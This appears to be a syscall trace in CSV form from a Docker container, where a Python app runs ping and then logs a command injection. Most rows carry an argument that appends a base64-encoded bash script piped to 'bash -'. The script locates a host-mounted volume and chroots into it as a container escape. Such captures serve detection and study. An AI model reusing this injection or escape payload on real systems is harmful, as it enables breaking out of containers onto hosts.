evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
13:03:32.085703977,recvmsg,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=84 size=84 data=E..T}...@...................L.lc....tN...................... !#$%&'()*+
13:03:32.085718634,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[28524]) size=57
13:03:32.085768584,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=57 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.055 ms.
13:03:32.085773543,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[28524]) size=1
13:03:32.085776318,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=1 data=.
13:03:32.085790665,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,fd=1(<p>pipe:[28524]) size=147
13:03:32.085792438,write,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,res=147 data=--- 127.0.0.1 ping statistics ---.4 packets transmitted
13:03:32.085795053,exit_group,/:/host:rw:true:rslave,-c 4 127.0.0.1,1,0,4,6536,
13:03:32.085833559,read,/:/host:rw:true:rslave,app.py,2,0,6,149800,res=205 data=64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.055 ms..--- 127.0.0.1 ping sta
13:03:32.085879353,read,/:/host:rw:true:rslave,app.py,2,0,6,149800,fd=5(<p>pipe:[28524]) size=7767
13:03:32.088425310,wait4,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
13:03:32.088457158,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
13:03:32.088467928,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0 fd1=3(<p>) fd2=4(<p>) ino=28894
13:03:32.088470012,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,
13:03:32.088602053,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=12 exe=/bin/sh args=-c.ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3Jlc... tid=2895(sh) pid=2895(sh) ptid=2894(python3) cwd= fdlimit=1048576 pgft_maj=0 pgft_min=93 vm_size=4504 vm_rss=736 vm_swap=0 comm=sh cgroups=cpuset=/docker/4dfd817f85f2fc459c280bfabcc5f61b18be06fc3dac94790b29b16fad7a63... flags=562036736(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID) uid=1000 gid=1000 vtid=10 vpid=10
13:03:32.088656513,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,fd=4(<p>)
13:03:32.088659108,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,5,4504,res=0
13:03:32.088663216,clone,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0 exe=/bin/sh args=-c.ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3Jlc... tid=2938(sh) pid=2938(sh) ptid=2895(sh) cwd= fdlimit=1048576 pgft_maj=0 pgft_min=1 vm_size=4504 vm_rss=84 vm_swap=0 comm=sh cgroups=cpuset=/docker/4dfd817f85f2fc459c280bfabcc5f61b18be06fc3dac94790b29b16fad7a63... flags=562036736(CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID) uid=1000 gid=1000 vtid=12 vpid=12
13:03:32.088671190,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
13:03:32.088697859,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/local/sbin/base64
13:03:32.088700955,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
13:03:32.088713107,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/local/bin/base64
13:03:32.088715542,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
13:03:32.088734136,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=-2(ENOENT) path=/usr/sbin/base64
13:03:32.088735979,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
13:03:32.088812270,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,fd=3(<p>)
13:03:32.088816157,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0
13:03:32.088818131,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,fd=4
13:03:32.088820996,dup2,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,res=1(<p>pipe:[28524]) oldfd=4 newfd=1(<p>pipe:[28524])
13:03:32.088823260,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,fd=4
13:03:32.088824663,close,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,res=0
13:03:32.088886727,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,fd=1(<p>pipe:[28524]) size=297
13:03:32.088897146,write,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,res=297 data=IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBh
13:03:32.088908116,exit_group,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,3,4504,
13:03:32.089155445,stat,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,res=0 path=/usr/bin/base64
13:03:32.089172957,pipe,/:/host:rw:true:rslave,-c ping -c 4 127.0.0.1 && echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLiAvdXNyL2Jpbi9zaCA8PCAiRU9UIgpwd2QKZ3JlcCBkb2NrZXIgL3Byb2MvMS9jZ3JvdXAgfCB3YyAtbApwcwpFT1QKY2QgLQ==|base64 -d |bash -,1,0,4,4504,
